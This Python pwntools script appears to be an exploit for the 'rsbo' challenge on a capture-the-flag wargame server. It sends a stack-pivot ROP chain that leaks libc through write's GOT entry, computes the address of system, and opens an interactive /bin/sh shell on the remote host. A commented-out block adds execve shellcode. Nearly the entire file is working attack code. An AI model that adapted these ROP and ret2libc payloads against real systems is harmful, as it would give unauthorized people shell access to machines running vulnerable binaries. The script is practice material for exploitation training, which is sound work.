# -*- coding: utf-8 -*-
#!/usr/bin/env python
#   Version 
#   Author: WildfootW
#   GitHub: github.com/WildfootW
#   Copyright (C) 2019 WildfootW All rights reserved.
#

# completed

from pwn import *
#from my_pwn_tools import *

def print_payload(payload, message = None):
    if message != None:
        log.info(message)
    payload = str(payload)
    log.info("payload: " + payload)
    log.info("payload length: " + str(len(payload)))

context.arch = "i386"
context.os = "linux"
context.endian = "little"
# ["CRITICAL", "DEBUG", "ERROR", "INFO", "NOTSET", "WARN", "WARNING"]
context.log_level = "DEBUG"
context.terminal = ['tmux', 'split-window'] # ['tmux', 'neww']
#gdb.attach(r, execute='b main\n')

while True:
    is_local = True
    is_local = False
    r = process("./rsbo") #r = process("./a.out", env={"LD_PRELOAD" : "./libc.so.6"})
    libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")
    host = "127.0.0.1"
    port = 8888
    #r.close()
    #r = remote(host, port)
    if not is_local:
        host = "hackme.inndy.tw"
        port = 7706
        r = remote(host, port)
        libc = ELF("./libc-2.23.so")

    if is_local:
        #input("Attach in gdb and press Enter")
        gdb.attach(r, execute='b main\n')

    leave = 0x080484f8
    read_80_bytes = 0x804865c
    buffer_0 = 0x804b000 - 0x100
    buffer_1 = 0x804b000 - 0x200
    write_plt = 0x8048450
    write_got = 0x0804a028
    pop_ebx = 0x080483cd
    add_esp_8_pop_ebx = 0x080483ca

    payload  = flat(['\x00' * (108 - 4), buffer_0]) # EBP
    payload += flat([read_80_bytes, leave, buffer_0])
    print_payload(payload)
    r.send(payload)

    input("next step")

    payload  = flat([buffer_1]) # EBP
    payload += flat([write_plt, add_esp_8_pop_ebx, 0x1, write_got, 0x4])
    payload += flat([read_80_bytes, pop_ebx, buffer_1])
    payload += flat([leave])
    payload += flat(["/bin/sh\x00"]) # buffer_0 + 40
    print_payload(payload)
    r.send(payload)

    write_libc = u32(r.recvn(4))
    print("write libc: " + hex(write_libc))
    base_libc = write_libc - libc.symbols[b"write"]
    print("base libc: " + hex(base_libc))
    system_libc = base_libc + libc.symbols[b"system"]
    print("system libc: " + hex(system_libc))

    input("next step")

    payload  = flat([buffer_0]) # EBP
    payload += flat([system_libc, pop_ebx, buffer_0 + 40])
    payload += flat([read_80_bytes, pop_ebx, buffer_0])
    payload += flat([leave])
    print_payload(payload)
    r.send(payload)

# NX enable
#    input("next step")
#
#    shellcode = asm("""
#    xor ecx, ecx
#    xor edx, edx
#    jmp str
#execve:
#    pop ebx
#    mov eax, 0xb
#    int 0x80
#    mov eax, 0x1
#    int 0x80
#str:
#    call execve
#    .ascii "/bin/sh"
#    .byte 0
#""")
## read into buffer_0
#    payload  = flat([buffer_1]) # EBP
#    payload += flat([buffer_0 + 0x8]) # return to shellcode
#    payload += flat([shellcode])
#    print_payload(payload)
#    r.send(payload)

    r.interactive("Pwned # ")

